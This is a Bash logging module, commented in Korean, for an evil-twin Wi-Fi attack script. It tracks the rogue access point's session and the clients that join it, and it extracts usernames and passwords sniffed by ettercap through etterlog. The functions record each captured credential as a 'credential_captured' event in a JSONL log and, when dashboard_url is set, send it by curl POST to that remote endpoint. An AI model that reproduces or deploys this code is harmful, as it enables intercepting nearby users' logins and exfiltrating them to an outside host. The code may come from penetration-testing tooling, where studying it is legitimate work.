#!/usr/bin/env bash
# et_logger.sh - Attack event logging and dashboard data for et_sniffing_attack.sh
# Source this file; requires bssid, essid, channel, interface, et_dos_attack, tmpdir globals.

_log_dir="${log_dir:-/tmp/et_logs}"
_log_file=""
_summary_file="${_log_dir}/et_summary.json"
_log_start_epoch=0
_log_start_time=""
_log_dhcp_monitor_pid=""

# JSON 문자열에서 역슬래시와 큰따옴표를 이스케이프하여 유효한 JSON 값으로 변환
function _json_escape() {
	local s="${1//\\/\\\\}"
	s="${s//\"/\\\"}"
	printf '%s' "${s}"
}

# 단일 이벤트를 JSONL 파일에 한 줄로 기록하고, dashboard_url이 설정된 경우 HTTP POST로 전송
# $1: 이벤트 타입 (attack_start | client_connected | credential_captured | attack_stop)
# $2: data 필드에 넣을 JSON 객체 문자열
function _log_event() {
	local event_type="${1}"
	local data_json="${2}"
	local ts
	ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
	printf '{"type":"%s","timestamp":"%s","data":%s}\n' \
		"${event_type}" "${ts}" "${data_json}" >> "${_log_file}"

	# dashboard_url이 설정된 경우 백그라운드에서 비동기 전송
	if [ -n "${dashboard_url:-}" ]; then
		local payload
		payload=$(printf '{"type":"%s","timestamp":"%s","data":%s}' \
			"${event_type}" "${ts}" "${data_json}")
		curl -sf -X POST "${dashboard_url}" \
			-H "Content-Type: application/json" \
			-d "${payload}" > /dev/null 2>&1 &
	fi
}

# 현재 공격 상태(경과 시간·연결 클라이언트 수)를 et_summary.json에 덮어써 대시보드 폴링용으로 갱신
function _log_update_summary() {
	local elapsed=0
	if [ "${_log_start_epoch}" -gt 0 ]; then
		elapsed=$(( $(date +%s) - _log_start_epoch ))
	fi
	local client_count=0
	if [ -f "${tmpdir}clts.txt" ]; then
		client_count=$(grep -c "DHCPACK on" "${tmpdir}clts.txt" 2>/dev/null || true)
		client_count=${client_count:-0}
	fi
	local escaped_essid
	escaped_essid=$(_json_escape "${essid}")
	cat > "${_summary_file}" <<EOF
{
  "status": "running",
  "bssid": "${bssid}",
  "essid": "${escaped_essid}",
  "channel": ${channel},
  "interface": "${interface}",
  "dos_method": "$(_json_escape "${et_dos_attack}")",
  "start_time": "${_log_start_time}",
  "elapsed_seconds": ${elapsed},
  "connected_clients": ${client_count},
  "log_file": "${_log_file}"
}
EOF
}

# 로그 디렉토리 생성, JSONL 파일 경로 확정, 공격 시작 이벤트(attack_start) 기록
# ESSID의 특수문자를 파일명에서 제거해 안전한 파일명을 만든 뒤 _log_file 경로를 설정
function log_init() {
	mkdir -p "${_log_dir}" 2>/dev/null
	_log_start_epoch=$(date +%s)
	_log_start_time=$(date -u +%Y-%m-%dT%H:%M:%SZ)

	local safe_essid
	safe_essid=$(printf '%s' "${essid}" | tr -cd '[:alnum:]_-')
	_log_file="${_log_dir}/et_${safe_essid}_$(date +%Y%m%d_%H%M%S).jsonl"

	local escaped_essid
	escaped_essid=$(_json_escape "${essid}")
	_log_event "attack_start" \
		"{\"bssid\":\"${bssid}\",\"essid\":\"${escaped_essid}\",\"channel\":${channel},\"interface\":\"${interface}\",\"dos_method\":\"$(_json_escape "${et_dos_attack}")\"}"

	_log_update_summary
	echo "[+] Logging started: ${_log_file}"
	if [ -n "${dashboard_url:-}" ]; then
		echo "[+] Dashboard endpoint: ${dashboard_url}"
	fi
}

# clts.txt를 5초 주기로 읽어 새로 등장한 DHCP 클라이언트(IP·MAC)를 client_connected 이벤트로 기록
# seen_ips 연관 배열로 이미 기록한 IP를 추적해 중복 이벤트 방지
function _log_monitor_dhcp_clients() {
	local -A seen_ips=()
	while true; do
		if [ -f "${tmpdir}clts.txt" ]; then
			while IFS= read -r line; do
				if [[ "${line}" =~ DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]]([0-9a-fA-F:]+) ]]; then
					local ip="${BASH_REMATCH[1]}"
					local mac="${BASH_REMATCH[2]}"
					if [ -z "${seen_ips[${ip}]+set}" ]; then
						seen_ips["${ip}"]=1
						_log_event "client_connected" \
							"{\"ip\":\"${ip}\",\"mac\":\"${mac}\"}"
						_log_update_summary
					fi
				fi
			done < "${tmpdir}clts.txt"
		fi
		sleep 5
	done
}

# _log_monitor_dhcp_clients를 백그라운드 서브쉘로 실행하고 PID를 _log_dhcp_monitor_pid에 저장
function log_start_dhcp_monitor() {
	_log_monitor_dhcp_clients &
	_log_dhcp_monitor_pid=$!
}

# 저장된 PID로 DHCP 모니터 백그라운드 프로세스를 종료하고 PID를 초기화
function log_stop_dhcp_monitor() {
	if [ -n "${_log_dhcp_monitor_pid}" ]; then
		kill "${_log_dhcp_monitor_pid}" 2>/dev/null
		wait "${_log_dhcp_monitor_pid}" 2>/dev/null
		_log_dhcp_monitor_pid=""
	fi
}

# ettercap 바이너리 로그(.eci)를 etterlog로 파싱해 USER:/PASS: 항목을 credential_captured 이벤트로 기록
# USER: 다음에 오는 PASS: 를 같은 세션으로 간주해 username_context 필드에 포함
function log_credentials() {
	local eci_file="${tmpdir}${ettercap_file}.eci"
	[ -f "${eci_file}" ] || return 0

	local cred_count=0
	local last_user=""
	while IFS= read -r cpass; do
		local ctype cval
		if [[ "${cpass}" =~ ^USER:[[:space:]]*(.*) ]]; then
			ctype="username"
			cval="${BASH_REMATCH[1]}"
			last_user="${cval}"
		elif [[ "${cpass}" =~ ^PASS:[[:space:]]*(.*) ]]; then
			ctype="password"
			cval="${BASH_REMATCH[1]}"
		else
			continue
		fi
		local escaped_val
		escaped_val=$(_json_escape "${cval}")
		local escaped_user
		escaped_user=$(_json_escape "${last_user}")
		_log_event "credential_captured" \
			"{\"credential_type\":\"${ctype}\",\"value\":\"${escaped_val}\",\"username_context\":\"${escaped_user}\"}"
		cred_count=$(( cred_count + 1 ))
	done < <(etterlog -L -p -i "${eci_file}" 2>/dev/null | grep -E -i "USER:|PASS:")

	[ "${cred_count}" -gt 0 ] && echo "[+] Logged ${cred_count} credential entries."
}

# DHCP 모니터를 종료하고 attack_stop 이벤트를 기록한 뒤 최종 상태의 et_summary.json을 작성
function log_finalize() {
	log_stop_dhcp_monitor

	local elapsed=$(( $(date +%s) - _log_start_epoch ))
	local client_count=0
	if [ -f "${tmpdir}clts.txt" ]; then
		client_count=$(grep -c "DHCPACK on" "${tmpdir}clts.txt" 2>/dev/null || true)
		client_count=${client_count:-0}
	fi
	local cred_count=0
	if [ -f "${_log_file}" ]; then
		cred_count=$(grep -c '"type":"credential_captured"' "${_log_file}" 2>/dev/null || true)
		cred_count=${cred_count:-0}
	fi

	_log_event "attack_stop" \
		"{\"elapsed_seconds\":${elapsed},\"connected_clients\":${client_count},\"credentials_captured\":${cred_count}}"

	local escaped_essid
	escaped_essid=$(_json_escape "${essid}")
	cat > "${_summary_file}" <<EOF
{
  "status": "stopped",
  "bssid": "${bssid}",
  "essid": "${escaped_essid}",
  "channel": ${channel},
  "interface": "${interface}",
  "dos_method": "$(_json_escape "${et_dos_attack}")",
  "start_time": "${_log_start_time}",
  "stop_time": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "elapsed_seconds": ${elapsed},
  "connected_clients": ${client_count},
  "credentials_captured": ${cred_count},
  "log_file": "${_log_file}"
}
EOF

	echo "[+] Log file   : ${_log_file}"
	echo "[+] Summary    : ${_summary_file}"
}
